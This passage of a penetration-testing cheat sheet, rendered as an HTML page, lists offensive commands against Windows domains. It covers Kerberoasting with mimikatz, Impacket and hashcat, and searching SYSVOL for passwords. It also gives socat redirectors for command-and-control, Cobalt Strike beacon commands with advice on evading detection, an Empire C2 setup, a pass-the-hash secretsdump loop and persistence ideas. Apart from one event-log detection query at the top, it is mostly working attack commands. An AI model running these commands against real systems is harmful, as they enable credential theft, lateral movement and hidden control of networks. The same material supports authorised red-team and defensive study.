13</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nt">&lt;QueryList&gt;</span>
    <span class="nt">&lt;Query</span> <span class="na">Id=</span><span class="s">&quot;0&quot;</span> <span class="na">Path=</span><span class="s">&quot;Security&quot;</span><span class="nt">&gt;</span>
    <span class="nt">&lt;Select</span> <span class="na">Path=</span><span class="s">&quot;Security&quot;</span><span class="nt">&gt;</span>
    *[System[EventID=&#39;4768&#39;]]
    and
    *[EventData[Data[@Name=&#39;TargetUserName&#39;] != &#39;ANONYMOUS LOGON&#39;]]
    and
    *[EventData[Data[@Name=&#39;ServiceName&#39;] = &#39;krbtgt&#39;]]
    and
    *[EventData[Data[@Name=&#39;TicketEncryptionType&#39;] = &#39;0x17&#39;]]
    <span class="nt">&lt;/Select&gt;</span>
    <span class="nt">&lt;/Query&gt;</span>
    <span class="nt">&lt;/QueryList&gt;</span>
</pre></div>
</td></tr></table></p>
<h3 id="kerberoast">Kerberoast<a class="headerlink" href="#kerberoast" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a>
<a href="https://room362.com/post/2016/kerberoast-pt1/">https://room362.com/post/2016/kerberoast-pt1/</a>
<a href="https://room362.com/post/2016/kerberoast-pt2/">https://room362.com/post/2016/kerberoast-pt2/</a>
<a href="https://room362.com/post/2016/kerberoast-pt3/">https://room362.com/post/2016/kerberoast-pt3/</a>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Add</span><span class="o">-</span><span class="k">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="k">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">;</span> <span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="ss">&quot;MSSQLSvc/host.domain.com&quot;</span> 
</pre></div>
</td></tr></table></p>
<p>Use mimikatz to export SPN Tikets once requested (Generates one file per ticket unless base64 option is used)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">mimkatz</span> <span class="nv">kerberos</span>::<span class="nv">list</span> <span class="o">/</span><span class="nv">export</span>
    <span class="nv">Invoke</span><span class="o">-</span><span class="nv">Mimikatz</span> <span class="o">-</span><span class="nv">Command</span> <span class="s1">&#39;</span><span class="s">standard::base64 &quot;kerberos::list /export&quot; exit</span><span class="s1">&#39;</span>
</pre></div>
</td></tr></table></p>
<p>Impacket method of extracting SPN tickets and output hashes in the correct format for John via Proxychains and Beacon (Preferred)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">proxychains</span> <span class="n">python</span> <span class="p">.</span><span class="o">/</span><span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">request</span> <span class="k">domain</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">domainuser</span><span class="p">:</span><span class="n">password</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="o">&lt;</span><span class="k">domain</span> <span class="n">controller</span> <span class="n">IP</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">outputfile</span> <span class="o">&lt;</span><span class="k">out</span><span class="p">.</span><span class="n">dump</span><span class="o">&gt;</span>
</pre></div>
</td></tr></table></p>
<p>Cracking the hashes
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">.</span><span class="o">/</span><span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">13100</span> <span class="o">-</span><span class="n">a</span> <span class="mi">0</span> <span class="n">spns</span><span class="p">.</span><span class="n">dump</span> <span class="p">.</span><span class="o">/</span><span class="n">wordlists</span><span class="cm">/* -r rules/dive.rule</span>

<span class="cm">    ./john --format=krb5tgs spns.dump --wordlist=</span>
</pre></div>
</td></tr></table></p>
<h3 id="domain-admin-privesc-methods">Domain Admin Privesc Methods<a class="headerlink" href="#domain-admin-privesc-methods" title="Permanent link">&para;</a></h3>
<p><a href="https://adsecurity.org/?p=2362">https://adsecurity.org/?p=2362</a></p>
<ol>
<li>
<p>Passwords in SYSVOL &amp; Group Policy Preferences</p>
<p><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">findstr</span> <span class="o">/</span><span class="n">S</span> <span class="n">cpassword</span> <span class="o">%</span><span class="n">logonserver</span><span class="o">%</span><span class="err">\</span><span class="n">sysvol</span><span class="err">\</span><span class="o">*</span><span class="p">.</span><span class="n">xml</span>
</pre></div>
</td></tr></table>
or use Get-GPPPasswords.ps1 from PowerSploit</p>
</li>
<li>
<p>Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch</p>
</li>
<li>Kerberos TGS Service Ticket Offline Cracking (Kerberoast)</li>
<li>The Credential Theft Shuffle</li>
<li>Gain access to AD Database file (ntds.dit)<ul>
<li>Backup locations (backup server storage, media, and/or network shares)</li>
<li>Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers.</li>
<li>With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline.</li>
</ul>
</li>
</ol>
<h2 id="command-and-control">Command and Control<a class="headerlink" href="#command-and-control" title="Permanent link">&para;</a></h2>
<p>Simple TCP Port Redirection
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">socat</span> <span class="n">TCP</span><span class="o">-</span><span class="k">LISTEN</span><span class="p">:</span><span class="mi">80</span><span class="p">,</span><span class="n">fork</span> <span class="n">TCP</span><span class="p">:</span><span class="o">&lt;</span><span class="n">remote</span> <span class="k">host</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">80</span>
    <span class="n">socat</span> <span class="n">TCP</span><span class="o">-</span><span class="k">LISTEN</span><span class="p">:</span><span class="mi">443</span><span class="p">,</span><span class="n">fork</span> <span class="n">TCP</span><span class="p">:</span><span class="o">&lt;</span><span class="n">remote</span> <span class="k">host</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">443</span>
</pre></div>
</td></tr></table></p>
<p>UDP Port Redirection 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nt">socat</span> <span class="nt">udp4-recvfrom</span><span class="p">:</span><span class="nd">53</span><span class="o">,</span><span class="nt">reuseaddr</span><span class="o">,</span><span class="nt">fork</span> <span class="nt">udp4-sendto</span><span class="o">:&lt;</span><span class="nt">IPADDRESS</span><span class="o">&gt;;</span> <span class="nt">echo</span> <span class="nt">-ne</span>
</pre></div>
</td></tr></table></p>
<p>Simple HTTP Redirect</p>
<p>Save as a file like the following as redirect.html and map to root "/" on your Team Server. Casual browsing to the root of your domain will then simply redirect.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;title&gt;</span>Google<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;refresh&quot;</span> <span class="na">content=</span><span class="s">&quot;0;url=https://www.googlrrrr.com&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/html&gt;</span>
</pre></div>
</td></tr></table></p>
<h3 id="domain-fronting">Domain Fronting<a class="headerlink" href="#domain-fronting" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://github.com/rvrsh3ll/FindFrontableDomains">https://github.com/rvrsh3ll/FindFrontableDomains</a></li>
</ul>
<h3 id="cobalt-strike">Cobalt Strike<a class="headerlink" href="#cobalt-strike" title="Permanent link">&para;</a></h3>
<p><a href="http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/">http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/</a>
<a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna">https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna</a>
<a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">portscan</span> <span class="mi">10</span><span class="p">.</span><span class="mi">42</span><span class="p">.</span><span class="mi">175</span><span class="p">.</span><span class="mi">0</span><span class="o">/</span><span class="mi">26</span> <span class="mi">21</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">443</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">1433</span><span class="p">,</span><span class="mi">3389</span><span class="p">,</span><span class="mi">8080</span><span class="p">,</span><span class="mi">8443</span>
</pre></div>
</td></tr></table></p>
<p><em>Start Remote Beacon DLL via iwmi</em>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">powerpick</span> <span class="n">iwmi</span> <span class="o">-</span><span class="k">class</span> <span class="n">Win32_Process</span> <span class="o">-</span><span class="n">name</span> <span class="k">create</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="ss">&quot;rundll32.exe c:\users\public\libraries\smb_beacon.dll.log0,StartW&quot;</span>
</pre></div>
</td></tr></table></p>
<h4 id="opsec-considerations-for-beacon-commands">OPSEC Considerations for Beacon Commands<a class="headerlink" href="#opsec-considerations-for-beacon-commands" title="Permanent link">&para;</a></h4>
<p><a href="https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/#respond">Blog.Cobaltstrike.com - OPSEC Considerations For Beacon Commands</a></p>
<p>A good operator knows their tools and has an idea of how the tool is accomplishing its objectives on their behalf. This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe.</p>
<p><em>API-only</em>
These commands are built-into Beacon and rely on Win32 APIs to meet their objectives.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">cd</span>
    <span class="nv">cp</span>
    <span class="nv">download</span>
    <span class="nv">drives</span>
    <span class="k">exit</span>
    <span class="nv">getuid</span>
    <span class="nv">kerberos_ccache_use</span>
    <span class="nv">kerberos_ticket_purge</span>
    <span class="nv">kerberos_ticket_use</span>
    <span class="nv">jobkill</span>
    <span class="nv">kill</span>
    <span class="nv">link</span>
    <span class="nv">ls</span>
    <span class="nv">make_token</span>
    <span class="nv">mkdir</span>
    <span class="nv">mv</span>
    <span class="nv">ppid</span>
    <span class="nv">ps</span>
    <span class="nv">pwd</span>
    <span class="nv">rev2self</span>
    <span class="nv">rm</span>
    <span class="nv">rportfwd</span>
    <span class="nv">socks</span>
    <span class="nv">steal_token</span>
    <span class="nv">timestomp</span>
    <span class="k">unlink</span>
    <span class="nv">upload</span>
</pre></div>
</td></tr></table></p>
<p><em>House-keeping Commands</em>
The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">cancel</span>
    <span class="n">checkin</span>
    <span class="n">clear</span>
    <span class="n">downloads</span>
    <span class="n">help</span>
    <span class="n">jobs</span>
    <span class="k">mode</span> <span class="n">dns</span>
    <span class="k">mode</span> <span class="n">dns</span><span class="o">-</span><span class="n">txt</span>
    <span class="k">mode</span> <span class="n">dns6</span>
    <span class="k">mode</span> <span class="n">http</span>
    <span class="n">note</span>
    <span class="n">powershell</span><span class="o">-</span><span class="n">import</span>
    <span class="n">sleep</span>
    <span class="n">socks</span> <span class="n">stop</span>
    <span class="n">spawnto</span>
</pre></div>
</td></tr></table></p>
<p><em>Post-Exploitation Jobs (Process Execution + Remote Process Injection)</em>
Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">browserpivot</span>
    <span class="n">bypassuac</span>
    <span class="n">covertvpn</span>
    <span class="n">dcsync</span>
    <span class="n">desktop</span>
    <span class="n">elevate</span>
    <span class="n">hashdump</span>
    <span class="n">keylogger</span>
    <span class="n">logonpasswords</span>
    <span class="n">mimikatz</span>
    <span class="n">net</span>
    <span class="n">portscan</span>
    <span class="n">powerpick</span>
    <span class="n">psinject</span>
    <span class="n">pth</span>
    <span class="n">screenshot</span>
    <span class="n">shspawn</span>
    <span class="n">spawn</span>
    <span class="n">ssh</span>
    <span class="n">ssh</span><span class="o">-</span><span class="k">key</span>
    <span class="n">wdigest</span>
</pre></div>
</td></tr></table></p>
<p>OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably dont want that). The ppid command will change the parent process these jobs are run under as well.</p>
<p><em>Process Execution</em>
These commands spawn a new process:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">execute</span>
    <span class="n">runas</span>
    <span class="n">runu</span>
</pre></div>
</td></tr></table></p>
<p>OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu.</p>
<p><em>Process Execution: Cmd.exe</em>
The shell command depends on cmd.exe.</p>
<p>The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe.</p>
<p>OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Scripts &amp;bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand.</p>
<p><em>Process Execution: PowerShell.exe</em>
The following commands launch powershell.exe to perform some task on your behalf.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">powershell</span>
<span class="n">spawnas</span>
<span class="n">spawnu</span>
<span class="n">winrm</span>
<span class="n">wmi</span>
</pre></div>
</td></tr></table></p>
<p>OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">spawnu</span> <span class="n">has</span> <span class="n">runu</span> <span class="n">which</span> <span class="n">runs</span> <span class="n">an</span> <span class="n">arbitrary</span> <span class="n">command</span> <span class="k">under</span> <span class="n">another</span> <span class="n">process</span><span class="p">.</span>
<span class="n">spawnas</span> <span class="n">has</span> <span class="n">runas</span> <span class="n">which</span> <span class="n">runs</span> <span class="n">an</span> <span class="n">arbitrary</span> <span class="n">command</span> <span class="k">as</span> <span class="n">another</span> <span class="k">user</span><span class="p">.</span>
<span class="n">powershell</span> <span class="n">has</span> <span class="n">powerpick</span><span class="p">,</span> <span class="n">this</span> <span class="n">command</span> <span class="n">runs</span> <span class="n">powershell</span> <span class="n">scripts</span> <span class="k">without</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span><span class="p">.</span>
</pre></div>
</td></tr></table></p>
<p>Its also possible to laterally spread without the winrm and wmi commands.
Remote Process Injection</p>
<p>The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">dllinject</span>
<span class="n">inject</span>
<span class="n">shinject</span>
</pre></div>
</td></tr></table></p>
<p><em>Service Creation</em></p>
<p>The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">getsystem</span>
    <span class="n">psexec</span>
    <span class="n">psexec_psh</span>
</pre></div>
</td></tr></table></p>
<h4 id="powershell-function-wrapper">Powershell Function Wrapper<a class="headerlink" href="#powershell-function-wrapper" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna">https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna</a>
<a href="https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/">https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/</a></p>
<h4 id="persistence-scripts">Persistence Scripts<a class="headerlink" href="#persistence-scripts" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script</a>
<a href="https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna">https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna</a></p>
<h3 id="empire">EMPIRE<a class="headerlink" href="#empire" title="Permanent link">&para;</a></h3>
<p>Cheat sheets 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">adaptivethreat</span><span class="o">/</span><span class="n">Empire</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">Quickstart</span>
    <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">attackerkb</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">Powershell</span><span class="o">/</span><span class="n">Powershell_Empire</span>
</pre></div>
</td></tr></table></p>
<p>Clone GIT Repo
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="n">root</span><span class="nv">@workstation</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="n">clone</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">adaptivethreat</span><span class="o">/</span><span class="n">Empire</span><span class="p">.</span><span class="n">git</span><span class="w"> </span><span class="n">empire</span><span class="w"></span>
<span class="w">    </span><span class="n">Cloning</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="s1">&#39;empire&#39;</span><span class="p">...</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<p>Install Empire
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">root</span>@<span class="nv">workstation</span>:<span class="o">~</span># <span class="nv">cd</span> <span class="nv">empire</span><span class="o">/</span>
    <span class="nv">root</span>@<span class="nv">workstation</span>:<span class="o">~/</span><span class="nv">empire</span># <span class="nv">cd</span> <span class="nv">setup</span><span class="o">/</span>
    <span class="nv">root</span>@<span class="nv">workstation</span>:<span class="o">~/</span><span class="nv">empire</span><span class="o">/</span><span class="nv">setup</span># .<span class="o">/</span><span class="nv">install</span>.<span class="nv">sh</span>
    <span class="nv">Reading</span> <span class="nv">package</span> <span class="nv">lists</span>... <span class="nv">Done</span>
    <span class="nv">Building</span> <span class="nv">dependency</span> <span class="nv">tree</span>
    <span class="nv">Reading</span> <span class="nv">state</span> <span class="nv">information</span>... <span class="nv">Done</span>
    ...

    <span class="nv">Successfully</span> <span class="nv">installed</span> <span class="nv">pydispatcher</span>
    <span class="nv">Cleaning</span> <span class="nv">up</span>...

     [<span class="o">&gt;</span>] <span class="nv">Enter</span> <span class="nv">server</span> <span class="nv">negotiation</span> <span class="nv">password</span>, <span class="nv">enter</span> <span class="k">for</span> <span class="k">random</span> <span class="nv">generation</span>:

     [<span class="o">*</span>] <span class="nv">Database</span> <span class="nv">setup</span> <span class="nv">completed</span><span class="o">!</span>

    <span class="nv">root</span>@<span class="nv">workstation</span>:<span class="o">~/</span><span class="nv">empire</span><span class="o">/</span><span class="nv">setup</span>#
</pre></div>
</td></tr></table></p>
<p>Start Empire
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="n">root</span><span class="nv">@workstation</span><span class="err">:</span><span class="o">~/</span><span class="n">empire</span><span class="o">/</span><span class="n">setup</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
<span class="w">    </span><span class="n">root</span><span class="nv">@workstation</span><span class="err">:</span><span class="o">~/</span><span class="n">empire</span><span class="err">#</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">empire</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<p>Start with REST API for use with Empire Web
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">.</span><span class="o">/</span><span class="n">empire</span> <span class="c1">--headless --username admin --password &lt;PASSWORD&gt; --restport 1337</span>

    <span class="p">.</span><span class="o">/</span><span class="n">empire</span> <span class="c1">--rest --username admin --password &lt;PASSWORD&gt; --restport 1337</span>
</pre></div>
</td></tr></table></p>
<h4 id="c2-profiles">C2 Profiles<a class="headerlink" href="#c2-profiles" title="Permanent link">&para;</a></h4>
<p>Edit default client settings in <code class="codehilite"><span class="o">/</span><span class="n">setup</span><span class="o">/</span><span class="n">setup_database</span><span class="p">.</span><span class="n">py</span></code></p>
<p>Example Default Profile
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="ss">&quot;/CWoNaJLBo/VTNeWw11212/|Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)|Accept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*|Accept-Language:en-en&quot;</span>
</pre></div>
</td></tr></table></p>
<h2 id="linux">Linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h2>
<h3 id="bash">BASH<a class="headerlink" href="#bash" title="Permanent link">&para;</a></h3>
<p>BASH loop example
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">for</span> <span class="nv">u</span> <span class="nv">in</span> `<span class="nv">cat</span> <span class="nv">hosts</span>.<span class="nv">txt</span>`<span class="c1">; do</span>
        <span class="nv">echo</span> <span class="o">-</span><span class="nv">n</span> <span class="s2">&quot;</span><span class="s">[*] user: $u</span><span class="s2">&quot;</span> <span class="o">&amp;&amp;</span> \
        <span class="nv">proxychains</span> <span class="nv">python</span> <span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">local</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">secretsdump</span>.<span class="nv">py</span> <span class="nv">domain</span><span class="o">/</span><span class="nv">username</span>@$<span class="nv">u</span> <span class="o">-</span><span class="nv">hashes</span> <span class="nv">aad3b435b51404eeaad3b435b51404ee</span>:<span class="mi">0</span><span class="nv">e493911f561a425e7a905329f4454bf</span> <span class="o">|</span><span class="nv">tee</span> <span class="nv">user_brute</span>.<span class="nv">log</span>
    <span class="nv">done</span>
</pre></div>
</td></tr></table></p>
<p>BASH .bashrc Function Example
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">function</span> <span class="nf">start_sshtunnel</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">ssh</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">t</span> <span class="o">-</span><span class="n">p22</span> <span class="o">-</span><span class="n">L</span> <span class="mi">8800</span><span class="o">:</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">8800</span> <span class="n">james</span><span class="mf">@123.001.123</span> <span class="o">-</span><span class="n">t</span> <span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="mi">8800</span><span class="o">:</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">80</span> <span class="n">james</span><span class="mf">@124.125.123</span>
    <span class="p">}</span>
</pre></div>
</td></tr></table></p>
<p>Quick BASH format .bash_profile (mod ipconfig &gt; ifconfig for Linux)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="codehilite"><pre><span></span># .<span class="nv">bash_profile</span>

<span class="nv">PATH</span><span class="o">=</span>$<span class="nv">PATH</span>:<span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">james</span><span class="o">/</span>

<span class="nv">export</span> <span class="nv">PATH</span>

<span class="nv">alias</span> <span class="nv">ls</span><span class="o">=</span><span class="s1">&#39;</span><span class="s">ls -G</span><span class="s1">&#39;</span>
<span class="nv">alias</span> <span class="nv">grep</span><span class="o">=</span><span class="s1">&#39;</span><span class="s">grep --color=auto</span><span class="s1">&#39;</span>
<span class="nv">alias</span> <span class="nv">la</span><span class="o">=</span><span class="s1">&#39;</span><span class="s">ls -AlahG</span><span class="s1">&#39;</span>
<span class="nv">alias</span> <span class="nv">el</span><span class="o">=</span><span class="s1">&#39;</span><span class="s">sudo $(history -p \!\!)</span><span class="s1">&#39;</span>
<span class="nv">alias</span> <span class="nv">ll</span><span class="o">=</span><span class="s1">&#39;</span><span class="s">ls -alF</span><span class="s1">&#39;</span>
<span class="nv">alias</span> <span class="nv">l</span><span class="o">=</span><span class="s1">&#39;</span><span class="s">ls -CF</span><span class="s1">&#39;</span>
<span class="nv">alias</span> <span class="nv">lg</span><span class="o">=</span><span class="s1">&#39;</span><span class="s">ls -AlahG |grep $1</span><span class="s1">&#39;</span>
<span class="nv">alias</span> <span class="nv">netstati</span><span class="o">=</span><span class="s1">&#39;</span><span class="s">lsof -P -i -n</span><span class="s1">&#39;</span>

<span class="nv">export</span> <span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s">\[\$(if [[ \$? == 0 ]]; then echo \</span><span class="s2">&quot;</span>\[$<span class="nv">GREEN</span>\]\<span class="s2">&quot;</span><span class="s">; else echo \</span><span class="s2">&quot;</span>\[$<span class="nv">RED</span>\]\<span class="s2">&quot;</span><span class="s">; fi)[\033[33m\]\D{%Y%m%d_%H%M%S}\[\033[m\] \[\033[36m\]\u@\h__`ipconfig getifaddr en0`__`ipconfig getifaddr en8`\[\033[m\]] \[\033[1;31m\]</span><span class="se">\n</span><span class="s">[\w]\[\033[m\] </span><span class="se">\n</span><span class="s"> \$ </span>
</pre></div>
</td></tr></table></p>
<p>Create NTLM Hash from Mac CLI
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="n">password</span> <span class="o">|</span> <span class="n">iconv</span> <span class="o">-</span><span class="n">t</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">16</span><span class="n">LE</span> <span class="o">|</span> <span class="n">openssl</span> <span class="n">md4</span>
</pre></div>
</td></tr></table></p>
<h3 id="linux-persistence-ideas">Linux Persistence Ideas<a class="headerlink" href="#linux-persistence-ideas" title="Permanent link">&para;</a></h3>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Cron</span>
    <span class="k">Add</span> <span class="n">SSH</span> <span class="n">keys</span>
